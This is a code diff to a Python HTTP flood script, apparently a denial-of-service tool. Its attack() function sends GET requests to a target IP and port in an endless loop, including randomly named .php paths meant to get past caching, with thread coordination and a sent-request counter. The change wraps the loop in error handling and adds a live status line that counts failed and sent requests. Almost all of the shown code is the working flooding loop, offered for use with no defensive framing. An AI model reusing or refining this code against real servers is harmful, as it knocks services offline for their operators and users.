@@ -15,6 +15,7 @@ ip = ""
 port = 80
 period = 10
 num_sent = 0
+req_error = 0
 rpath = False
 a_z = [
     "a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z",
@@ -110,20 +111,28 @@ def port443(x,request):
 def attack():
     global path
     global num_sent
+    global req_error
     header = rqheader()
     go.wait()
+    LINE_UP = '\033[1A'
+    LINE_CLEAR = '\x1b[2K'
     while True:
-        if rpath == True:
-            path = "/"+Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + ".php"
-        get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
-        request = get_host + header
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, port))
-        num_sent = num_sent + 1
-        print("[+] Sent ", path, num_sent, " => ", ip , ":", port)
-        if port == 443:
-            x = ssl.wrap_socket(s)
-            port443(x,request)
+        try:
+            if rpath == True:
+                path = "/"+Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + Choice(a_z) + ".php"
+            get_host = "GET " + path + " HTTP/1.1\r\nHost: " + ip +":"+str(port)+ "\r\n"
+            request = get_host + header
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((ip, port))
+            num_sent = num_sent + 1
+            print("[+] [Failed Request]: " + str(req_error) + " ["+ str(num_sent) + " SENT] => "+ip+":"+str(port)+path, end="\r")
+            print(LINE_CLEAR + LINE_UP,end=LINE_CLEAR)
+            if port == 443:
+                x = ssl.wrap_socket(s)
+                port443(x,request)
+        except:
+            req_error=req_error+1
+
 
 
 def build_thread():
